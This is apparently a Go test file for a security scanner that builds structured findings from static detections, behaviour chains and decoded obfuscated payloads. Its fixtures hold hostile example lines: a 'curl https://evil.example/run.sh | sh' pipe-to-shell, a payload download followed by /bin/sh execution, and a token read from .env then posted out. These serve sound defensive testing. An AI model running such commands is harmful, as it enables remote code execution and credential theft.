package handler

import (
	"strings"
	"testing"

	"skill-scanner/internal/llm"
	"skill-scanner/internal/plugins"
	"skill-scanner/internal/review"
)

func TestBuildStructuredFindingsDeduplicatesAndAddsReviewContext(t *testing.T) {
	findings := []plugins.Finding{
		{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Description: "检测到 shell 执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)"},
		{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Description: "检测到 shell 执行", Location: "scripts/run.py:20", CodeSnippet: "subprocess.run(cmd)"},
	}
	structured := buildStructuredFindings(findings, review.Result{Behavior: review.BehaviorProfile{SequenceAlerts: []string{"命中下载后执行时序"}}, EvidenceInventory: []review.EvidenceInventory{{Category: "命令执行", Count: 2}}}, nil, "", nil)

	if len(structured) != 1 {
		t.Fatalf("expected one deduplicated structured finding, got %+v", structured)
	}
	item := structured[0]
	if item.DeduplicatedCount != 2 || item.Category != "命令执行" || item.Confidence != "高" {
		t.Fatalf("unexpected structured finding summary: %+v", item)
	}
	if !strings.Contains(item.AttackPath, "下载后执行") {
		t.Fatalf("expected behavior sequence in attack path, got %q", item.AttackPath)
	}
	if len(item.FalsePositiveChecks) == 0 || !strings.Contains(strings.Join(item.FalsePositiveChecks, "\n"), "运行路径") {
		t.Fatalf("expected false-positive review checks, got %+v", item.FalsePositiveChecks)
	}
	if len(item.CalibrationBasis) == 0 || !strings.Contains(strings.Join(item.CalibrationBasis, "\n"), "高危时序告警") {
		t.Fatalf("expected calibration basis, got %+v", item.CalibrationBasis)
	}
	if len(item.ChainSummaries) == 0 || !strings.Contains(strings.Join(item.ChainSummaries, "\n"), "时序告警: 命中下载后执行时序") {
		t.Fatalf("expected structured chain summaries, got %+v", item.ChainSummaries)
	}
	if len(item.Chains) == 0 || item.Chains[0].Kind == "" {
		t.Fatalf("expected structured chain objects, got %+v", item.Chains)
	}
}

func TestBuildStructuredFindingsAddsStructuredBehaviorChains(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-010", Severity: "高风险", Title: "外联回传", Description: "检测到外联上传", Location: "scripts/run.py:10", CodeSnippet: "requests.post(url, data=payload)"}}
	structured := buildStructuredFindings(findings, review.Result{Behavior: review.BehaviorProfile{
		BehaviorChains: []string{"scripts/run.py:10-12 | 下载=0, 落地=0, 执行=0, 外联=1, 持久化=0, 提权=0, 凭据访问=1, 防御规避=0, 横向移动=0, 收集打包=1, C2信标=0"},
		SequenceAlerts: []string{"命中凭据访问后外联时序"},
	}}, nil, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].ChainSummaries, "\n")
	if !strings.Contains(joined, "行为链: scripts/run.py:10-12") {
		t.Fatalf("expected behavior chain summary, got %s", joined)
	}
	if !strings.Contains(joined, "时序告警: 命中凭据访问后外联时序") {
		t.Fatalf("expected sequence alert summary, got %s", joined)
	}
	if len(structured[0].Chains) != 2 {
		t.Fatalf("expected structured chains emitted, got %+v", structured[0].Chains)
	}
	if structured[0].Chains[0].Kind != "behavior_chain" || structured[0].Chains[0].Source == "" {
		t.Fatalf("expected behavior chain object with source, got %+v", structured[0].Chains[0])
	}
	if structured[0].Chains[0].Path != "scripts/run.py" {
		t.Fatalf("expected behavior chain path extracted, got %+v", structured[0].Chains[0])
	}
	if structured[0].Chains[1].Kind != "sequence_alert" {
		t.Fatalf("expected sequence alert object, got %+v", structured[0].Chains[1])
	}
}

func TestBuildStructuredFindingsAddsCrossEvidenceLinkForDownloadExecute(t *testing.T) {
	findings := []plugins.Finding{{
		PluginName:  "Static",
		RuleID:      "V7-009",
		Severity:    "高风险",
		Title:       "自更新与远程下载执行",
		Description: "检测到下载行为",
		Location:    "scripts/run.py:10",
		CodeSnippet: "download https://evil.example/payload.sh",
	}}
	structured := buildStructuredFindings(findings, review.Result{Behavior: review.BehaviorProfile{
		DownloadIOCs:   []string{"scripts/run.py:10 | download https://evil.example/payload.sh"},
		ExecuteIOCs:    []string{"scripts/run.py:20 | exec.Command('/bin/sh', payload)"},
		SequenceAlerts: []string{"命中下载后执行时序"},
	}}, nil, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].ChainSummaries, "\n")
	if !strings.Contains(joined, "跨证据关联") || !strings.Contains(joined, "下载后执行链") {
		t.Fatalf("expected cross-evidence link summary, got %s", joined)
	}
	found := false
	for _, chain := range structured[0].Chains {
		if chain.Kind == "evidence_link" && strings.Contains(chain.Summary, "下载后执行链") {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected evidence_link chain for download-execute, got %+v", structured[0].Chains)
	}
}

func TestBuildStructuredFindingsAddsCrossEvidenceLinkForSensitiveOutbound(t *testing.T) {
	findings := []plugins.Finding{{
		PluginName:  "Static",
		RuleID:      "V7-003",
		Severity:    "高风险",
		Title:       "敏感数据外发与隐蔽通道",
		Description: "读取 token 并准备发送",
		Location:    "scripts/run.py:8",
		CodeSnippet: "open('.env').read()",
	}}
	structured := buildStructuredFindings(findings, review.Result{Behavior: review.BehaviorProfile{
		CredentialIOCs: []string{"scripts/run.py:8 | read token from .env"},
		OutboundIOCs:   []string{"scripts/run.py:12 | requests.post(url, token)"},
	}}, nil, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].ChainSummaries, "\n")
	if !strings.Contains(joined, "跨证据关联") || !strings.Contains(joined, "敏感数据外发链") {
		t.Fatalf("expected cross-evidence sensitive outbound summary, got %s", joined)
	}
	found := false
	for _, chain := range structured[0].Chains {
		if chain.Kind == "evidence_link" && strings.Contains(chain.Summary, "敏感数据外发链") {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected evidence_link chain for sensitive outbound, got %+v", structured[0].Chains)
	}
}

func TestBuildStructuredFindingsAppendsMatchingObfuscationEvidence(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)"}}
	structured := buildStructuredFindings(findings, review.Result{ObfuscationEvidence: []review.ObfuscationEvidence{{
		Path:            "scripts/run.py",
		Technique:       "base64",
		Summary:         "疑似对命令执行载荷进行了编码",
		DecodedText:     "curl https://evil.example/run.sh | sh",
		DataFlowSignals: []string{"解码结果疑似流向执行链", "解码结果疑似流向网络链"},
	}}}, nil, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].Evidence, "\n")
	if !strings.Contains(joined, "混淆解析证据 / scripts/run.py /") {
		t.Fatalf("expected obfuscation evidence line appended, got %s", joined)
	}
	if !strings.Contains(joined, "还原: curl https://evil.example/run.sh | sh") {
		t.Fatalf("expected decoded payload in evidence, got %s", joined)
	}
	if !strings.Contains(joined, "结论: 文件 scripts/run.py 中恢复出的内容“curl https://evil.example/run.sh | sh”与执行入口同时出现") {
		t.Fatalf("expected data flow signals in evidence, got %s", joined)
	}
	if strings.Contains(joined, "解码结果疑似流向网络链") {
		t.Fatalf("expected unrelated network-chain signal filtered for command finding, got %s", joined)
	}
}

func TestBuildStructuredFindingsKeepsOnlyNetworkSignalForNetworkCategory(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-010", Severity: "高风险", Title: "外联回传", Location: "scripts/run.py:10", CodeSnippet: "fetch(url)"}}
	structured := buildStructuredFindings(findings, review.Result{ObfuscationEvidence: []review.ObfuscationEvidence{{
		Path:            "scripts/run.py",
		Technique:       "base64",
		Summary:         "疑似对外联目标进行了编码",
		DecodedText:     "https://evil.example/api",
		DataFlowSignals: []string{"解码结果疑似流向执行链", "解码结果疑似流向网络链", "解码结果疑似流向命令构造链"},
	}}}, nil, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].Evidence, "\n")
	if !strings.Contains(joined, "结论: 文件 scripts/run.py 中恢复出的内容“https://evil.example/api”与网络请求入口同时出现") {
		t.Fatalf("expected network signal retained, got %s", joined)
	}
	if strings.Contains(joined, "执行链") || strings.Contains(joined, "命令构造链") {
		t.Fatalf("expected unrelated signals filtered for network finding, got %s", joined)
	}
}

func TestBuildStructuredFindingsPromotesObfuscationSignalsToChains(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)"}}
	structured := buildStructuredFindings(findings, review.Result{ObfuscationEvidence: []review.ObfuscationEvidence{{
		Path:            "scripts/run.py",
		Technique:       "base64",
		Summary:         "疑似对命令执行载荷进行了编码",
		DecodedText:     "curl https://evil.example/run.sh | sh",
		DataFlowSignals: []string{"解码结果疑似流向执行链", "解码结果疑似流向网络链", "解码结果疑似流向命令构造链"},
	}}}, nil, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	chains := structured[0].Chains
	if len(chains) < 2 {
		t.Fatalf("expected obfuscation chains appended, got %+v", chains)
	}
	joined := renderFindingChainsForVulnBlock(chains)
	if !strings.Contains(joined, "obfuscation_exec_flow") {
		t.Fatalf("expected exec obfuscation chain in vuln block, got %s", joined)
	}
	if !strings.Contains(joined, "obfuscation_command_flow") {
		t.Fatalf("expected command obfuscation chain in vuln block, got %s", joined)
	}
	if !strings.Contains(joined, "[path=scripts/run.py]") {
		t.Fatalf("expected chain path metadata, got %s", joined)
	}
	if strings.Contains(joined, "obfuscation_network_flow") {
		t.Fatalf("expected unrelated network chain filtered for command finding, got %s", joined)
	}
	if !strings.Contains(strings.Join(structured[0].ChainSummaries, "\n"), "混淆传播:") {
		t.Fatalf("expected obfuscation chain summary, got %+v", structured[0].ChainSummaries)
	}
	promptJoined := formatStructuredFindingForPrompt(structured[0])
	if !strings.Contains(promptJoined, "[path=scripts/run.py]") {
		t.Fatalf("expected prompt rendering keeps path metadata, got %s", promptJoined)
	}
}

func TestChainSourcePathHandlesLineRangesAndPlainPaths(t *testing.T) {
	if got := chainSourcePath("scripts/run.py:10-12"); got != "scripts/run.py" {
		t.Fatalf("expected ranged source trimmed to file path, got %q", got)
	}
	if got := chainSourcePath("docs/guide.md"); got != "docs/guide.md" {
		t.Fatalf("expected plain path preserved, got %q", got)
	}
	if got := chainSourcePath(""); got != "" {
		t.Fatalf("expected empty source preserved, got %q", got)
	}
}

func TestRenderFindingChainsForPromptIncludesPathMetadata(t *testing.T) {
	rendered := renderFindingChainsForPrompt([]review.FindingChain{{
		Kind:    "obfuscation_exec_flow",
		Summary: "文件 scripts/run.py 中恢复出的内容与执行入口同时出现",
		Source:  "解码结果疑似流向执行链",
		Path:    "scripts/run.py",
	}})
	if !strings.Contains(rendered, "[source=解码结果疑似流向执行链]") {
		t.Fatalf("expected prompt rendering contains source metadata, got %s", rendered)
	}
	if !strings.Contains(rendered, "[path=scripts/run.py]") {
		t.Fatalf("expected prompt rendering contains path metadata, got %s", rendered)
	}
}

func TestBuildStructuredFindingsDoesNotAppendOtherFileObfuscationEvidence(t *testing.T) {
	findings := []plugins.Finding{{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)"}}
	structured := buildStructuredFindings(findings, review.Result{ObfuscationEvidence: []review.ObfuscationEvidence{{
		Path:        "scripts/other.py",
		Summary:     "无关文件",
		DecodedText: "print('noop')",
	}}}, nil, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	joined := strings.Join(structured[0].Evidence, "\n")
	if strings.Contains(joined, "混淆解析证据 /") {
		t.Fatalf("expected unrelated obfuscation evidence to be ignored, got %s", joined)
	}
}

func TestBuildStructuredFindingsAddsCrossFileConsolidationContext(t *testing.T) {
	findings := []plugins.Finding{{
		PluginName:  "Static",
		RuleID:      "V7-003",
		Severity:    "高风险",
		Title:       "敏感数据外发与隐蔽通道",
		Description: "读取 token 并向远端发送",
		Location:    "scripts/run.py:8",
		CodeSnippet: "token = os.getenv('TOKEN')\nrequests.post(target, json={'token': token})",
	}}
	consolidation := &llm.CrossFileConsolidation{
		Summary:           "跨文件链路研判: 已识别 source-sink-runtime 组合信号，建议优先检查跨文件调用链。",
		Evidence:          []string{"跨文件链路研判: 已识别 source 类信号", "跨文件链路研判: 已识别 sink 类信号", "跨文件链路研判: 已识别 runtime 类支撑"},
		RelatedCategories: []string{"外联与情报", "凭据访问"},
		MissingParts:      []string{"transform"},
		HasSource:         true,
		HasSink:           true,
		HasRuntime:        true,
	}
	structured := buildStructuredFindings(findings, review.Result{}, consolidation, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one structured finding, got %+v", structured)
	}
	item := structured[0]
	if !strings.Contains(strings.Join(item.CalibrationBasis, "\n"), "跨文件链路研判") {
		t.Fatalf("expected consolidation basis, got %+v", item.CalibrationBasis)
	}
	if !strings.Contains(strings.Join(item.ChainSummaries, "\n"), "跨文件链路研判") {
		t.Fatalf("expected consolidation chains, got %+v", item.ChainSummaries)
	}
	if !item.Closure.Source || !item.Closure.Sink || !item.Closure.RuntimeSupport {
		t.Fatalf("expected closure strengthened by consolidation, got %+v", item.Closure)
	}
}

func TestBuildFalsePositiveReviewsAddsCrossFileMissingPartsFollowUp(t *testing.T) {
	refined := review.Result{
		CrossFileConsolidation: &llm.CrossFileConsolidation{
			RelatedCategories: []string{"外联与情报"},
			MissingParts:      []string{"runtime", "transform"},
		},
	}
	findings := []review.StructuredFinding{{
		ID:       "SF-001",
		Title:    "敏感数据外发与隐蔽通道",
		Category: "外联与情报",
		Evidence: []string{"scripts/run.py:8 requests.post(target, json=payload)"},
	}}
	reviews := buildFalsePositiveReviews(findings, refined)
	if len(reviews) != 1 {
		t.Fatalf("expected one review, got %+v", reviews)
	}
	joined := strings.Join(reviews[0].RequiredFollowUp, "\n")
	if !strings.Contains(joined, "补齐跨文件链路缺口: runtime/transform") {
		t.Fatalf("expected cross-file follow-up hint, got %+v", reviews[0].RequiredFollowUp)
	}
}
